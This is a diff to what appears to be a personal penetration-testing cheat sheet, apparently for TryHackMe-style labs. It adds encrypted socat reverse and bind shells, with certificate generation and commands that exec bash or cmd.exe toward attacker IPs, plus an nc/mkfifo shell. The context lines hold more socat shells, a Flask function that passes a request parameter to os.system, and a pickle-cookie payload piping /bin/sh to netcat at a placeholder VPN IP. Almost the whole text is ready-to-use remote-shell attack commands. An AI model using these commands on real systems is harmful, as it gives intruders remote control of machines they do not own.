@@ -259,6 +259,19 @@ socat TCP-L:<PORT> EXEC:"bash -li"                                              
 socat TCP-L:<port> FILE:`tty`,raw,echo=0                                            # Linux binds PS bt socat (listener)   
 socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+cat shell.key shell.crt > shell.pem
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes              # Target
+socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -                                  # Attacker
+
+socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0             # Target
+socat OPENSSL:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+####################################################################################
+mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 
 ####################### create reversshells util ##################################
 
@@ -272,6 +285,8 @@ script -qc /bin/bash /dev/null
 ####################################################################################
 def rce():
   return os.system(request.args.get('cmd'))
+
+
 
 #############################cookie injection pickle base64 ##########################################
 command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'
